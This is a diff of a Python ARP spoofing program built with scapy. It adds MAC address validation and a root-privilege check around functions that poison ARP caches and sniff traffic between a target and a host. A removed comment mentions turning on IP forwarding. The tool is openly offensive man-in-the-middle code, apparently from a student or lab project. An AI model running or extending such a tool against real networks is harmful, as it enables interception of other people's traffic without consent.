@@ -1,11 +1,6 @@
 # /usr/bin/python3 
 '''
 ARPSpoof Program by Clayton Johnson and Mitchell Bohn
-
-Steps:
-	Take IPs and find their MAC Addresses through ARP Request
-We need to run this automatically: sysctl -w net.ipv4.ip_forward=1
-
 '''
 import argparse
 from scapy.all import Ether, ARP, sr, send, sniff
@@ -37,10 +32,17 @@ def clean_ip(addr):
 				ret_addr += byte + '.'
 	return ret_addr[:-1]
 
-def clean_mac(mac):
+def clean_mac(_mac):
 	#Makes sure that the mac address is valid
-
-	return mac
+	print(_mac)
+	mac_arr = _mac.split(':')
+	mac = ''
+	if len(mac_arr) == 6:
+		for sub in mac_arr:
+			val = int(sub, 16)
+			if val < 256 and val > -1:
+				mac += sub + ':'
+	return mac[:-1]
 
 def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
 	print('Poisoning...')
@@ -131,13 +133,18 @@ def spoof_time(t_ip, h_ip):
 	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread)
 
 if __name__ == '__main__':
-	#Usage : $ arpspoof.py -t <targetIP> -r <hostIP>
-	parser = argparse.ArgumentParser()
-	parser.add_argument('-t', help='target ip address')
-	parser.add_argument('-r', help='host ip address')
-	args = parser.parse_args()
-	if args.t and args.r:
-		spoof_time(clean_ip(args.t), clean_ip(args.r))
+	#Check permissions, otherwise will fail
+	if os.geteuid() is 0:
+		#Usage : $ arpspoof.py -t <targetIP> -r <hostIP>
+		parser = argparse.ArgumentParser()
+		parser.add_argument('-t', help='target ip address')
+		parser.add_argument('-r', help='host ip address')
+		args = parser.parse_args()
+		if args.t and args.r:
+			spoof_time(clean_ip(args.t), clean_ip(args.r))
+		else:
+			parser.print_help(sys.stderr)
+			sys.exit(1)	
 	else:
-		parser.print_help(sys.stderr)
-		sys.exit(1)	
+		print('Run with sudo privileges')
+		exit(1)
